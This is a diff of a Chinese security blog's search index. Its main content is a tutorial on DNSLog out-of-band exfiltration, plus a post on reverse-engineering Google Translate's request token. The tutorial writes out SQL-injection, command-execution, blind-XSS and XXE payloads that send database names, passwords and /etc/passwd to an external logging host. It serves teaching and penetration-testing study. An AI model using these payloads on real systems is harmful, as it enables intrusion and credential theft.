@@ -1,6 +1,88 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>通过DNSLog获取无回显信息</title>
+    <url>/2020/07/04/DNSLog/</url>
+    <content><![CDATA[<h2 id="0x01-原理">0x01 原理</h2>
+<blockquote>
+<p>NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析<br>
+DNS：域名解析服务器<br>
+A记录：指定域名对应的IP地址</p>
+</blockquote>
+<p><strong>一句话归纳</strong>😪😪：<br>
+　　<font color=blue>将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。</font></p>
+<ul>
+<li>案例解释</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping &#96;whoami&#96;.test.com	&#x2F;&#x2F;发出请求</span><br><span class="line">ping root.test.com	&#x2F;&#x2F;实际请求</span><br></pre></td></tr></table></figure>
+<p><code>whoami</code>在命令行中就自动解析了，所以其实是向<code>root.test.com</code>发出的请求，这时就会被DNS服务器所捕获，我们就能从日志中获取命令执行后的结果了。那到底怎么利用DNSLog进行注入呢？其实只要是能够发出请求的地方都可以用这种方式获取数据。</p>
+<h2 id="0x02-DNSLog平台">0x02 DNSLog平台</h2>
+<p>一、在线平台：<code>http://ceye.io</code>、<code>http://www.dnslog.cn</code></p>
+<p>二、自己搭建DNSLog服务器：<code>https://github.com/BugScanTeam/DNSLog</code></p>
+<p>三、 BurpSuite collaborator</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105715.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105732.png" alt=""></p>
+<p>点击Copy to Clipboard获取一个标识<br>
+比如我这里获取到的就是<code>s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net</code><br>
+然后用这个外带就行了</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105806.png" alt=""></p>
+<h2 id="0x03-DNSLog常用场景">0x03 DNSLog常用场景</h2>
+<ol>
+<li>SQL盲注</li>
+<li>命令执行（无回显）</li>
+<li>XSS（无回显）</li>
+<li>SSRF(无回显)</li>
+</ol>
+<h3 id="SQL盲注">SQL盲注</h3>
+<p>以MySQL为例，在MySQL中有个一个<font color=blue>load_file</font>函数可以用来读取本地的文件。前提是root权限。<br>
+show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
+<ul>
+<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
+<li>当secure_file_priv为E:\，就可以读取E盘的文件。</li>
+<li>当secure_file_priv为null，load_file就不能加载文件。</li>
+</ul>
+<p>⚠️ 注意：load_file函数在<font color=red>Linux</font>下是无法用来做dnslog攻击的，因为在这里就涉及到Windows——<font color=blue>UNC</font>路径。</p>
+<blockquote>
+<p>UNC路径：UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
+</blockquote>
+<p>平常在Widnows中用共享文件的时候就会用到这种网络地址的形式：<code>\\sss.xxx\test\</code><br>
+这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
+<p>⚠️ 如果查询的数据中出现了非字母数字的特殊字符，需要进行<font color=blue>转义</font>，这里用16进制。原因是如果出现如逗号，@符号等特殊符号，不能形成标准的dns域名，无法发出数据。</p>
+<ul>
+<li>几个例子</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接读取</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">hex转码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">取数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br></pre></td></tr></table></figure>
+<h3 id="命令执行">命令执行</h3>
+<h4 id="Windows下">Windows下</h4>
+<p>查看计算机名，其他类似</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping %COMPUTERNAME%.xxx.ceye.io</span><br></pre></td></tr></table></figure>
+<h4 id="Linux下">Linux下</h4>
+<p>查看当前用户和passwd文件，其他类似</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;</span><br><span class="line">curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;</span><br></pre></td></tr></table></figure>
+<h3 id="XSS">XSS</h3>
+<p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="SSRF">SSRF</h3>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-总结">0x04 总结</h2>
+<ul>
+<li>有些函数的使用具有操作系统的限制。</li>
+<li>DNS查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。</li>
+<li>避免一些特殊符号的产生，最好的选择就是数据先编码再带出。</li>
+<li>注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。</li>
+<li>有些操作是需要较高的权限。</li>
+</ul>
+<p>🌈🌈 利用DNSLog攻击的方法，能更加简便、高效的进行渗透测试，并且拥有足够权限，可以直接拿下目标站点。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BurpSuite——Intruder四种模式详解</title>
     <url>/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="一、Sniper（狙击手）">一、Sniper（狙击手）</h2>
@@ -126,170 +208,6 @@
       </categories>
       <tags>
         <tag>BurpSuite</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>通过DNSLog获取无回显信息</title>
-    <url>/2020/07/04/DNSLog/</url>
-    <content><![CDATA[<h2 id="0x01-原理">0x01 原理</h2>
-<blockquote>
-<p>NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析<br>
-DNS：域名解析服务器<br>
-A记录：指定域名对应的IP地址</p>
-</blockquote>
-<p><strong>一句话归纳</strong>😪😪：<br>
-　　<font color=blue>将需要查询的值和域名拼接起来，向域名发送请求，DNS在解析的时候会留下日志，读取日志便可以获取信息。</font></p>
-<ul>
-<li>案例解释</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping &#96;whoami&#96;.test.com	&#x2F;&#x2F;发出请求</span><br><span class="line">ping root.test.com	&#x2F;&#x2F;实际请求</span><br></pre></td></tr></table></figure>
-<p><code>whoami</code>在命令行中就自动解析了，所以其实是向<code>root.test.com</code>发出的请求，这时就会被DNS服务器所捕获，我们就能从日志中获取命令执行后的结果了。那到底怎么利用DNSLog进行注入呢？其实只要是能够发出请求的地方都可以用这种方式获取数据。</p>
-<h2 id="0x02-DNSLog平台">0x02 DNSLog平台</h2>
-<p>一、在线平台：<code>http://ceye.io</code>、<code>http://www.dnslog.cn</code></p>
-<p>二、自己搭建DNSLog服务器：<code>https://github.com/BugScanTeam/DNSLog</code></p>
-<p>三、 BurpSuite collaborator</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105715.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105732.png" alt=""></p>
-<p>点击Copy to Clipboard获取一个标识<br>
-比如我这里获取到的就是<code>s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net</code><br>
-然后用这个外带就行了</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105806.png" alt=""></p>
-<h2 id="0x03-DNSLog常用场景">0x03 DNSLog常用场景</h2>
-<ol>
-<li>SQL盲注</li>
-<li>命令执行（无回显）</li>
-<li>XSS（无回显）</li>
-<li>SSRF(无回显)</li>
-</ol>
-<h3 id="SQL盲注">SQL盲注</h3>
-<p>以MySQL为例，在MySQL中有个一个<font color=blue>load_file</font>函数可以用来读取本地的文件。前提是root权限。<br>
-show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
-<ul>
-<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
-<li>当secure_file_priv为E:\，就可以读取E盘的文件。</li>
-<li>当secure_file_priv为null，load_file就不能加载文件。</li>
-</ul>
-<p>⚠️ 注意：load_file函数在<font color=red>Linux</font>下是无法用来做dnslog攻击的，因为在这里就涉及到Windows——<font color=blue>UNC</font>路径。</p>
-<blockquote>
-<p>UNC路径：UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
-</blockquote>
-<p>平常在Widnows中用共享文件的时候就会用到这种网络地址的形式：<code>\\sss.xxx\test\</code><br>
-这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
-<p>⚠️ 如果查询的数据中出现了非字母数字的特殊字符，需要进行<font color=blue>转义</font>，这里用16进制。原因是如果出现如逗号，@符号等特殊符号，不能形成标准的dns域名，无法发出数据。</p>
-<ul>
-<li>几个例子</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接读取</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">hex转码</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">取数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br></pre></td></tr></table></figure>
-<h3 id="命令执行">命令执行</h3>
-<h4 id="Windows下">Windows下</h4>
-<p>查看计算机名，其他类似</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping %COMPUTERNAME%.xxx.ceye.io</span><br></pre></td></tr></table></figure>
-<h4 id="Linux下">Linux下</h4>
-<p>查看当前用户和passwd文件，其他类似</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;</span><br><span class="line">curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;</span><br></pre></td></tr></table></figure>
-<h3 id="XSS">XSS</h3>
-<p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="SSRF">SSRF</h3>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-总结">0x04 总结</h2>
-<ul>
-<li>有些函数的使用具有操作系统的限制。</li>
-<li>DNS查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。</li>
-<li>避免一些特殊符号的产生，最好的选择就是数据先编码再带出。</li>
-<li>注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。</li>
-<li>有些操作是需要较高的权限。</li>
-</ul>
-<p>🌈🌈 利用DNSLog攻击的方法，能更加简便、高效的进行渗透测试，并且拥有足够权限，可以直接拿下目标站点。</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JS逆向系列之谷歌翻译</title>
-    <url>/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/</url>
-    <content><![CDATA[<h3 id="一、逆向谷歌翻译">一、逆向谷歌翻译</h3>
-<h4 id="分析过程">分析过程</h4>
-<ul>
-<li>首次分析</li>
-</ul>
-<p>首先找到谷歌翻译的Ajax请求接口</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529141646.png" alt=""></p>
-<p>以get方式发送的Ajax请求，多次尝试，发现请求参数中，<code>tk</code>和<code>q</code>，是不断变化的，其中<code>q</code>是待翻译的内容，<code>tk</code>是根据<code>q</code>进行js加密算法生成的，所以我们要分析<code>tk</code>的产生。</p>
-<ul>
-<li>通过断点逆向<code>tk</code>的加密算法</li>
-</ul>
-<p>加密算法应该在translate_m_zh-CN.js文件里</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529142909.png" alt=""></p>
-<p>打个断点，请求翻译接口的URL时停止，发现在send(a)中停止了，根据Call Stack的调用关系，一步步分析，最上面的就是send函数</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143414.png" alt=""></p>
-<p>依次往下点击每一个调用的函数，当到了QE函数的时候，发现了<code>tk</code>参数来自b，b又明显来自c</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143742.png" alt=""></p>
-<p>于是我们顺藤摸瓜，发现c是由PE(d)产生的，PE又是来自pu(a)函数，我们跳转到pu函数的位置，似乎已经有了答案</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144207.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144416.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144520.png" alt=""></p>
-<ul>
-<li>分析生成<code>tk</code>的JS代码</li>
-</ul>
-<p>如下是我们刚获取的JS代码</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  , nu = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line">  , ou = <span class="literal">null</span></span><br><span class="line">  , pu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== ou)</span><br><span class="line">        <span class="keyword">var</span> b = ou;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        b = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">84</span>));</span><br><span class="line">        <span class="keyword">var</span> c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">75</span>));</span><br><span class="line">        b = [b(), b()];</span><br><span class="line">        b[<span class="number">1</span>] = c();</span><br><span class="line">        b = (ou = <span class="built_in">window</span>[b.join(c())] || <span class="string">&quot;&quot;</span>) || <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> d = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>));</span><br><span class="line">    c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">107</span>));</span><br><span class="line">    d = [d(), d()];</span><br><span class="line">    d[<span class="number">1</span>] = c();</span><br><span class="line">    c = <span class="string">&quot;&amp;&quot;</span> + d.join(<span class="string">&quot;&quot;</span>) + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    d = b.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    b = <span class="built_in">Number</span>(d[<span class="number">0</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h : (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> : (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>),</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) : e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>),</span><br><span class="line">        e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> c + (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>发现做了很多不必要的操作、甚至多此一举，目的是用于混淆<br>
-如：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var mu &#x3D; function(a) &#123;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        return a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>还用了<code>.fromCharCode()</code>函数，把数字转换为字母，明显多此一举的操作。但是，通过分析，发现<code>tk</code>生成需要另一样东西，就是<code>tkk</code>这个参数，来源于网页源代码上，寻找一番，还是发现了，多次尝试，发现这个值是固定的</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529145556.png" alt=""></p>
-<h4 id="具体实现">具体实现</h4>
-<p>说明：js文件做了精炼，把不必要的值去掉了，实行的效果是英译中，不同语言的翻译修改请求的参数即可</p>
-<ul>
-<li>Python脚本</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tk</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;google_tk.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        js = f.read()</span><br><span class="line">    j = execjs.<span class="built_in">compile</span>(js)</span><br><span class="line">    tk = j.call(<span class="string">&#x27;pu&#x27;</span>, q)</span><br><span class="line">    <span class="keyword">return</span> tk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate_google</span>():</span></span><br><span class="line">    q = <span class="built_in">input</span>(<span class="string">&quot;请输入你要翻译的内容：&quot;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://translate.google.cn/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk=&quot;</span> + get_tk(</span><br><span class="line">        q) + <span class="string">&quot;&amp;q=&quot;</span> + q</span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    data = res.content.decode()</span><br><span class="line">    json_data = json.loads(data)</span><br><span class="line">    print(json_data[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    translate_google()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<ul>
-<li>tk.js</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//tkk = &#x27;441865.2154418832&#x27;;</span></span><br><span class="line"><span class="keyword">var</span> nu = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">pu = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    tkk=<span class="string">&#x27;441865.2154418832&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> d = tkk.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">Number</span>(d[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h :</span><br><span class="line">            (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> :</span><br><span class="line">                    (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>), e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>, e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) :</span><br><span class="line">                        e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>, e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>), e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<h4 id="运行效果">运行效果</h4>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529150718.png" alt=""></p>
-<h3 id="二、总结常见算法的加密原理">二、总结常见算法的加密原理</h3>
-<ul>
-<li>散列(hash)函数算法：MD5、SHA</li>
-<li>对称加密算法：DES、3DES、AES</li>
-<li>非对称性加密算法：RSA、DSA、ECC</li>
-</ul>
-<h4 id="散列-hash-函数算法">散列(hash)函数算法</h4>
-<ul>
-<li>简介</li>
-</ul>
-<p>Hash也称散列、哈希，对应的英文都是Hash。基本原理就是把任意长度的输入，通过Hash算法变成固定长度的输出。这个映射的规则就是对应的Hash算法，而原始数据映射后的二进制串就是哈希值。活动开发中经常使用的MD5和SHA都是历史悠久的Hash算法。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo md5(&quot;这是一个测试文案&quot;);&#x2F;&#x2F; 输出结果：2124968af757ed51e71e6abeac04f98d</span><br></pre></td></tr></table></figure>
-<ul>
-<li>特点</li>
-</ul>
-<p>一、不可逆，与原视数据没有对应关系<br>
-二、输入数据的微小变化会得到完全不同的hash值，相同的数据会得到相同的值<br>
-三、hash算法冲突概率比较小，但是根据抽屉原理，一定会存在不同的输入被映射成相同输出的情况</p>
-<h4 id="对称加密算法">对称加密算法</h4>
-<ul>
-<li>简介</li>
-</ul>
-<p>秘钥：加密解密使用同一个密钥、数据的机密性双向保证、加密效率高、适合加密于大数据大文件、加密强度不高(相对于非对称加密)</p>
-<h4 id="非对称性加密算法">非对称性加密算法</h4>
-<ul>
-<li>简介</li>
-</ul>
